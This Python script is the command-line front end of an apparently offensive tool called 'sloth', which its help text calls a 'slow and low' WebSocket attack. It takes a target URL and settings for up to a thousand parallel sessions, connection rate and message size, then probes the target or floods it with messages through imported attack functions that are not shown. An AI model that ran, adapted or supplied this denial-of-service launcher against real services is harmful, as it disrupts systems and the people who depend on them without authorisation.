#!/usr/bin/env python3

import logging
import argparse
from enum import Enum
from urllib.parse import urlparse

from sloth.websocket_protocol import WSMessageType
from sloth.websocket_probe import probe as ws_probe
from sloth.websocket_attack import attack as ws_attack


class Protocol(Enum):
    """
    Values may not unique, so use name for determination.
    """
    WS_TEXT = WSMessageType.TEXT
    WS_BINARY = WSMessageType.BINARY


def _parse_url(target):
    """
    Given https://www.example.com/resource, return (True, 'www.example.com', 443, '/resource')
    """
    url = urlparse(target)

    if not url.netloc:
        raise Exception('Wrong URL format. Example: https://www.example.com/resource')

    if url.scheme in ('wss', 'https'):
        use_tls = True
    else:
        use_tls = False

    if ':' in url.netloc:
        host = url.netloc.split(':')[0]
        port = int(url.netloc.split(':')[1])
    else:
        host = url.netloc
        port = 443 if use_tls else 80

    path = url.path if url.path else '/'

    return use_tls, host, port, path


def main():
    parser = argparse.ArgumentParser(
        description='Slow and low TCP(WebSocket) attack',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument('--verbose', action='store_true', help='Verbose logging')
    parser.add_argument('--target', required=True, help='Target URL or host')
    parser.add_argument('--protocol', default=Protocol.WS_TEXT.name, choices=[p.name for p in Protocol], help='Protocol type')
    parser.add_argument('--length', default='1000', help='Length of each message in bytes')
    parser.add_argument('--probe', action='store_true', help='Try send one message with the specified length')
    parser.add_argument('--attack', action='store_true', help='Send flood messages with the specified length')
    parser.add_argument('--respawn', action='store_true', help='Respawn dead sockets or not (TBD)')
    parser.add_argument('--session', default='1000', help='Max parallel connection sessions for attack')
    parser.add_argument('--rate', default='10', help='New connections per second')
    args = parser.parse_args()

    if args.verbose:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", level=logging.DEBUG)
    else:
        logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%Y-%m-%d %H:%M:%S", level=logging.INFO)

    use_tls, host, port, path = _parse_url(args.target)

    if args.probe:
        if args.protocol in [Protocol.WS_TEXT.name, Protocol.WS_BINARY.name]:
            ws_probe(host, port, path, int(args.length), Protocol[args.protocol].value, use_tls)

    if args.attack:
        if args.protocol in [Protocol.WS_TEXT.name, Protocol.WS_BINARY.name]:
            ws_attack(host, port, path, int(args.length), int(args.session), Protocol[args.protocol].value, use_tls, float(args.rate))


if __name__ == '__main__':
    main()
